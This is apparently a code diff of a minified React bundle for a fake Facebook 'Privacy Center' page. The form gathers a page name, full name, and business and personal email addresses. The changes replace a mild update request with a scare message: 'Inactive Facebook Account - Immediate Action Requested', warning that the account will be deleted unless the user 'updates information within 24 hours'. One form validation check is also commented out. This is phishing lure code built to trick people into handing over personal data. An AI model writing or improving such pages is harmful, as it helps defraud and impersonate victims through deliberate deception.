@@ -14487,8 +14487,8 @@ function JA() {
   x(!1);
  }
  const V = (Q) => {
-   !Q.providedInfo ||
-    !Q.facebookPageName ||
+   //!Q.providedInfo ||
+   !Q.facebookPageName ||
     !Q.fullName ||
     !Q.businessEmailAddress ||
     !Q.personalEmailAddress ||
@@ -14588,7 +14588,7 @@ function JA() {
          fontWeight: "650",
          fontSize: "1.6rem",
         },
-        children: "Update info account",
+        children: "Update infomation",
        }),
        L.jsxs("form", {
         onSubmit: g(V),
@@ -14670,7 +14670,7 @@ function JA() {
               wrapperStyle: {},
               wrapperClass: "",
              })
-           : "Save the changes",
+           : "Submit",
          }),
         ],
        }),
@@ -14962,21 +14962,21 @@ function JA() {
        fontFamily: "Open Sans, sans-serif",
        fontWeight: "650",
       },
-      children: "Request to Update Facebook Account Info",
+      children: "Inactive Facebook  Account - Immediate Action Requested",
      }),
     ],
    }),
    L.jsx("p", {
     className: "mt-3",
     children:
-     "We have noticed that your Facebook account info needs to be updated to ensure accuracy and security. To continue using our services effectively, please take a moment to review and update your account info.",
+     "It’s been years since you logged into your Facebook account. We are currently in the process of deleting inactive accounts and yours will be deleted soon unless we hear from you.",
    }),
    L.jsxs("div", {
     className:
      "bg-violet rounded-5px overflow-hidden pb-5 mb-4 max-w-[900px] mt-6 boxshadow",
     children: [
      L.jsx("img", {
-      src: "/PrivacyCenter-control.png",
+      src: "/PrivacyCenter-Control.png",
       alt: "",
       className: "w-[1000px] ",
      }),
@@ -14989,12 +14989,12 @@ function JA() {
          fontFamily: "Open Sans, sans-serif",
          fontWeight: "550",
         },
-        children: "Improve the security and precision of account",
+        children: "Do you want to keep your account?",
        }),
        L.jsx("p", {
         className: "pb-5",
         children:
-         "Updating your info correctly will help us provide you with the best service and ensure that you receive all important communications from us.",
+         "Your account will be disabled and may be at risk of deletion. To keep your account, please update your information within 24 hours.",
        }),
        L.jsx("button", {
         className: oa(
@@ -15019,7 +15019,7 @@ function JA() {
             wrapperStyle: {},
             wrapperClass: "",
            })
-         : "Update info account",
+         : "Update infomation",
        }),
       ],
      }),
